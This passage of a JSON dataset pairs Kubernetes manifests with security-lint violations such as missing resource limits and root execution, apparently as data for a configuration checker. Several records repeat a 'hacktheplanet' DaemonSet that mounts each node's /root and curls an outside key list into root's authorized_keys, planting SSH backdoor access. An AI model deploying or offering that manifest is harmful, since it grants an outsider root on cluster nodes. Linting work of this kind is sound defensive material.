fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"train\" has memory limit 0"
  },
  {
    "id": "01358",
    "manifest_path": "data/manifests/the_stack_sample/sample_0425.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-resourcemanager-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-resourcemanager\n  template:\n    metadata:\n      labels:\n        app: linkis-resourcemanager\n        release: dev\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-resourcemanager\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-resourcemanager\n        image: wedatasphere/linkis:linkis-resourcemanager-0.11.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 14004\n        livenessProbe:\n          tcpSocket:\n            port: 14004\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '14004'\n        volumeMounts:\n        - name: linkis-resourcemanager-config\n          mountPath: /opt/linkis/conf\n        - name: varlog\n          mountPath: /opt/linkis/linkis-resourcemanager/logs\n        - name: hadoop-config\n          mountPath: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n        - name: hive-config\n          mountPath: /opt/hive/apache-hive-2.3.6-bin/conf\n        - name: spark-config\n          mountPath: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n      volumes:\n      - name: linkis-resourcemanager-config\n        configMap:\n          name: linkis-resourcemanager-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n      - name: hadoop-config\n        hostPath:\n          path: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n      - name: hive-config\n        hostPath:\n          path: /opt/hive/apache-hive-2.3.6-bin/conf\n      - name: spark-config\n        hostPath:\n          path: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"linkis-resourcemanager\" does not have a read-only root file system"
  },
  {
    "id": "01359",
    "manifest_path": "data/manifests/the_stack_sample/sample_0425.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-resourcemanager-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-resourcemanager\n  template:\n    metadata:\n      labels:\n        app: linkis-resourcemanager\n        release: dev\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-resourcemanager\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-resourcemanager\n        image: wedatasphere/linkis:linkis-resourcemanager-0.11.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 14004\n        livenessProbe:\n          tcpSocket:\n            port: 14004\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '14004'\n        volumeMounts:\n        - name: linkis-resourcemanager-config\n          mountPath: /opt/linkis/conf\n        - name: varlog\n          mountPath: /opt/linkis/linkis-resourcemanager/logs\n        - name: hadoop-config\n          mountPath: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n        - name: hive-config\n          mountPath: /opt/hive/apache-hive-2.3.6-bin/conf\n        - name: spark-config\n          mountPath: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n      volumes:\n      - name: linkis-resourcemanager-config\n        configMap:\n          name: linkis-resourcemanager-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n      - name: hadoop-config\n        hostPath:\n          path: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n      - name: hive-config\n        hostPath:\n          path: /opt/hive/apache-hive-2.3.6-bin/conf\n      - name: spark-config\n        hostPath:\n          path: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"linkis-resourcemanager\" is not set to runAsNonRoot"
  },
  {
    "id": "01360",
    "manifest_path": "data/manifests/the_stack_sample/sample_0425.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-resourcemanager-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-resourcemanager\n  template:\n    metadata:\n      labels:\n        app: linkis-resourcemanager\n        release: dev\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-resourcemanager\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-resourcemanager\n        image: wedatasphere/linkis:linkis-resourcemanager-0.11.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 14004\n        livenessProbe:\n          tcpSocket:\n            port: 14004\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '14004'\n        volumeMounts:\n        - name: linkis-resourcemanager-config\n          mountPath: /opt/linkis/conf\n        - name: varlog\n          mountPath: /opt/linkis/linkis-resourcemanager/logs\n        - name: hadoop-config\n          mountPath: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n        - name: hive-config\n          mountPath: /opt/hive/apache-hive-2.3.6-bin/conf\n        - name: spark-config\n          mountPath: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n      volumes:\n      - name: linkis-resourcemanager-config\n        configMap:\n          name: linkis-resourcemanager-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n      - name: hadoop-config\n        hostPath:\n          path: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n      - name: hive-config\n        hostPath:\n          path: /opt/hive/apache-hive-2.3.6-bin/conf\n      - name: spark-config\n        hostPath:\n          path: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"linkis-resourcemanager\" has cpu request 0"
  },
  {
    "id": "01361",
    "manifest_path": "data/manifests/the_stack_sample/sample_0425.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-resourcemanager-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-resourcemanager\n  template:\n    metadata:\n      labels:\n        app: linkis-resourcemanager\n        release: dev\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-resourcemanager\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-resourcemanager\n        image: wedatasphere/linkis:linkis-resourcemanager-0.11.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 14004\n        livenessProbe:\n          tcpSocket:\n            port: 14004\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '14004'\n        volumeMounts:\n        - name: linkis-resourcemanager-config\n          mountPath: /opt/linkis/conf\n        - name: varlog\n          mountPath: /opt/linkis/linkis-resourcemanager/logs\n        - name: hadoop-config\n          mountPath: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n        - name: hive-config\n          mountPath: /opt/hive/apache-hive-2.3.6-bin/conf\n        - name: spark-config\n          mountPath: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n      volumes:\n      - name: linkis-resourcemanager-config\n        configMap:\n          name: linkis-resourcemanager-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n      - name: hadoop-config\n        hostPath:\n          path: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n      - name: hive-config\n        hostPath:\n          path: /opt/hive/apache-hive-2.3.6-bin/conf\n      - name: spark-config\n        hostPath:\n          path: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"linkis-resourcemanager\" has memory limit 0"
  },
  {
    "id": "01362",
    "manifest_path": "data/manifests/the_stack_sample/sample_0427.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: mainnet-dump-staking-ledger-cronjob\nspec:\n  jobTemplate:\n    template:\n      spec:\n        volumes:\n        - name: gcloud-keyfile\n          secret:\n            secretName: gcloud-keyfile\n            defaultMode: 256\n            items:\n            - key: keyfile\n              path: keyfile.json\n        containers:\n        - name: mainnet-dump-staking-ledger-container\n          image: minaprotocol/mina-daemon-baked:1.1.5-a42bdee\n          env:\n          - name: GCLOUD_KEYFILE\n            value: /gcloud/keyfile.json\n          volumeMounts:\n          - name: gcloud-keyfile\n            mountPath: /gcloud/\n          command:\n          - /bin/bash\n          - -c\n          - 'mina daemon --generate-genesis-proof true --peer-list-url https://storage.googleapis.com/mina-seed-lists/mainnet_seeds.txt\n            --background;sleep 480;echo \"done sleeping\";while true;do mina ledger\n            export staking-epoch-ledger>staking_epoch_ledger.txt;if [ \"$?\" -eq 0 ]&&[\n            \"$(cat staking_epoch_ledger.txt)\" != \"Ledger not found: current staking\n            ledger not available\" ];then echo \"staking epoch ledger dumped!\";break;else\n            echo \"waiting for staking ledger to become available, sleeping for 30s\";sleep\n            30;fi;done;DATE=\"$(date +%F_%H%M)\";STAKING_LEDGER_HASH=\"$(mina ledger\n            hash --ledger-file staking_epoch_ledger.txt)\";LEDGER_FILENAME=\"$DATE\"_staking_epoch_ledger_\"$STAKING_LEDGER_HASH\".txt;mv\n            ./staking_epoch_ledger.txt ./$LEDGER_FILENAME;mina ledger export next-epoch-ledger>next_epoch_ledger.txt;echo\n            \"next epoch ledger dumped!\";NEXT_LEDGER_HASH=\"$(mina ledger hash --ledger-file\n            next_epoch_ledger.txt)\";NEXT_LEDGER_FILENAME=\"$DATE\"_next_epoch_ledger_\"$NEXT_LEDGER_HASH\".txt;mv\n            ./next_epoch_ledger.txt ./$NEXT_LEDGER_FILENAME;echo \"upload to a GCP\n            cloud storage bucket\";gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $LEDGER_FILENAME gs://mina-staking-ledgers;gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $NEXT_LEDGER_FILENAME gs://mina-staking-ledgers'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mainnet-dump-staking-ledger-container\" does not have a read-only root file system"
  },
  {
    "id": "01363",
    "manifest_path": "data/manifests/the_stack_sample/sample_0427.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: mainnet-dump-staking-ledger-cronjob\nspec:\n  jobTemplate:\n    template:\n      spec:\n        volumes:\n        - name: gcloud-keyfile\n          secret:\n            secretName: gcloud-keyfile\n            defaultMode: 256\n            items:\n            - key: keyfile\n              path: keyfile.json\n        containers:\n        - name: mainnet-dump-staking-ledger-container\n          image: minaprotocol/mina-daemon-baked:1.1.5-a42bdee\n          env:\n          - name: GCLOUD_KEYFILE\n            value: /gcloud/keyfile.json\n          volumeMounts:\n          - name: gcloud-keyfile\n            mountPath: /gcloud/\n          command:\n          - /bin/bash\n          - -c\n          - 'mina daemon --generate-genesis-proof true --peer-list-url https://storage.googleapis.com/mina-seed-lists/mainnet_seeds.txt\n            --background;sleep 480;echo \"done sleeping\";while true;do mina ledger\n            export staking-epoch-ledger>staking_epoch_ledger.txt;if [ \"$?\" -eq 0 ]&&[\n            \"$(cat staking_epoch_ledger.txt)\" != \"Ledger not found: current staking\n            ledger not available\" ];then echo \"staking epoch ledger dumped!\";break;else\n            echo \"waiting for staking ledger to become available, sleeping for 30s\";sleep\n            30;fi;done;DATE=\"$(date +%F_%H%M)\";STAKING_LEDGER_HASH=\"$(mina ledger\n            hash --ledger-file staking_epoch_ledger.txt)\";LEDGER_FILENAME=\"$DATE\"_staking_epoch_ledger_\"$STAKING_LEDGER_HASH\".txt;mv\n            ./staking_epoch_ledger.txt ./$LEDGER_FILENAME;mina ledger export next-epoch-ledger>next_epoch_ledger.txt;echo\n            \"next epoch ledger dumped!\";NEXT_LEDGER_HASH=\"$(mina ledger hash --ledger-file\n            next_epoch_ledger.txt)\";NEXT_LEDGER_FILENAME=\"$DATE\"_next_epoch_ledger_\"$NEXT_LEDGER_HASH\".txt;mv\n            ./next_epoch_ledger.txt ./$NEXT_LEDGER_FILENAME;echo \"upload to a GCP\n            cloud storage bucket\";gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $LEDGER_FILENAME gs://mina-staking-ledgers;gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $NEXT_LEDGER_FILENAME gs://mina-staking-ledgers'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mainnet-dump-staking-ledger-container\" is not set to runAsNonRoot"
  },
  {
    "id": "01364",
    "manifest_path": "data/manifests/the_stack_sample/sample_0427.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: mainnet-dump-staking-ledger-cronjob\nspec:\n  jobTemplate:\n    template:\n      spec:\n        volumes:\n        - name: gcloud-keyfile\n          secret:\n            secretName: gcloud-keyfile\n            defaultMode: 256\n            items:\n            - key: keyfile\n              path: keyfile.json\n        containers:\n        - name: mainnet-dump-staking-ledger-container\n          image: minaprotocol/mina-daemon-baked:1.1.5-a42bdee\n          env:\n          - name: GCLOUD_KEYFILE\n            value: /gcloud/keyfile.json\n          volumeMounts:\n          - name: gcloud-keyfile\n            mountPath: /gcloud/\n          command:\n          - /bin/bash\n          - -c\n          - 'mina daemon --generate-genesis-proof true --peer-list-url https://storage.googleapis.com/mina-seed-lists/mainnet_seeds.txt\n            --background;sleep 480;echo \"done sleeping\";while true;do mina ledger\n            export staking-epoch-ledger>staking_epoch_ledger.txt;if [ \"$?\" -eq 0 ]&&[\n            \"$(cat staking_epoch_ledger.txt)\" != \"Ledger not found: current staking\n            ledger not available\" ];then echo \"staking epoch ledger dumped!\";break;else\n            echo \"waiting for staking ledger to become available, sleeping for 30s\";sleep\n            30;fi;done;DATE=\"$(date +%F_%H%M)\";STAKING_LEDGER_HASH=\"$(mina ledger\n            hash --ledger-file staking_epoch_ledger.txt)\";LEDGER_FILENAME=\"$DATE\"_staking_epoch_ledger_\"$STAKING_LEDGER_HASH\".txt;mv\n            ./staking_epoch_ledger.txt ./$LEDGER_FILENAME;mina ledger export next-epoch-ledger>next_epoch_ledger.txt;echo\n            \"next epoch ledger dumped!\";NEXT_LEDGER_HASH=\"$(mina ledger hash --ledger-file\n            next_epoch_ledger.txt)\";NEXT_LEDGER_FILENAME=\"$DATE\"_next_epoch_ledger_\"$NEXT_LEDGER_HASH\".txt;mv\n            ./next_epoch_ledger.txt ./$NEXT_LEDGER_FILENAME;echo \"upload to a GCP\n            cloud storage bucket\";gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $LEDGER_FILENAME gs://mina-staking-ledgers;gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $NEXT_LEDGER_FILENAME gs://mina-staking-ledgers'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mainnet-dump-staking-ledger-container\" has cpu request 0"
  },
  {
    "id": "01365",
    "manifest_path": "data/manifests/the_stack_sample/sample_0427.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: mainnet-dump-staking-ledger-cronjob\nspec:\n  jobTemplate:\n    template:\n      spec:\n        volumes:\n        - name: gcloud-keyfile\n          secret:\n            secretName: gcloud-keyfile\n            defaultMode: 256\n            items:\n            - key: keyfile\n              path: keyfile.json\n        containers:\n        - name: mainnet-dump-staking-ledger-container\n          image: minaprotocol/mina-daemon-baked:1.1.5-a42bdee\n          env:\n          - name: GCLOUD_KEYFILE\n            value: /gcloud/keyfile.json\n          volumeMounts:\n          - name: gcloud-keyfile\n            mountPath: /gcloud/\n          command:\n          - /bin/bash\n          - -c\n          - 'mina daemon --generate-genesis-proof true --peer-list-url https://storage.googleapis.com/mina-seed-lists/mainnet_seeds.txt\n            --background;sleep 480;echo \"done sleeping\";while true;do mina ledger\n            export staking-epoch-ledger>staking_epoch_ledger.txt;if [ \"$?\" -eq 0 ]&&[\n            \"$(cat staking_epoch_ledger.txt)\" != \"Ledger not found: current staking\n            ledger not available\" ];then echo \"staking epoch ledger dumped!\";break;else\n            echo \"waiting for staking ledger to become available, sleeping for 30s\";sleep\n            30;fi;done;DATE=\"$(date +%F_%H%M)\";STAKING_LEDGER_HASH=\"$(mina ledger\n            hash --ledger-file staking_epoch_ledger.txt)\";LEDGER_FILENAME=\"$DATE\"_staking_epoch_ledger_\"$STAKING_LEDGER_HASH\".txt;mv\n            ./staking_epoch_ledger.txt ./$LEDGER_FILENAME;mina ledger export next-epoch-ledger>next_epoch_ledger.txt;echo\n            \"next epoch ledger dumped!\";NEXT_LEDGER_HASH=\"$(mina ledger hash --ledger-file\n            next_epoch_ledger.txt)\";NEXT_LEDGER_FILENAME=\"$DATE\"_next_epoch_ledger_\"$NEXT_LEDGER_HASH\".txt;mv\n            ./next_epoch_ledger.txt ./$NEXT_LEDGER_FILENAME;echo \"upload to a GCP\n            cloud storage bucket\";gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $LEDGER_FILENAME gs://mina-staking-ledgers;gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $NEXT_LEDGER_FILENAME gs://mina-staking-ledgers'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mainnet-dump-staking-ledger-container\" has memory limit 0"
  },
  {
    "id": "01366",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"hacktheplanet\" is using an invalid container image, \"alpine\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01367",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"web\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01368",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hacktheplanet\" does not have a read-only root file system"
  },
  {
    "id": "01369",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web\" does not have a read-only root file system"
  },
  {
    "id": "01370",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hacktheplanet\" is not set to runAsNonRoot"
  },
  {
    "id": "01371",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web\" is not set to runAsNonRoot"
  },
  {
    "id": "01372",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hacktheplanet\" has cpu request 0"
  },
  {
    "id": "01373",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web\" has cpu request 0"
  },
  {
    "id": "01374",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hacktheplanet\" has memory limit 0"
  },
  {
    "id": "01375",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web\" has memory limit 0"
  },
  {
    "id": "01376",
    "manifest_path": "data/manifests/the_stack_sample/sample_0433.yaml",
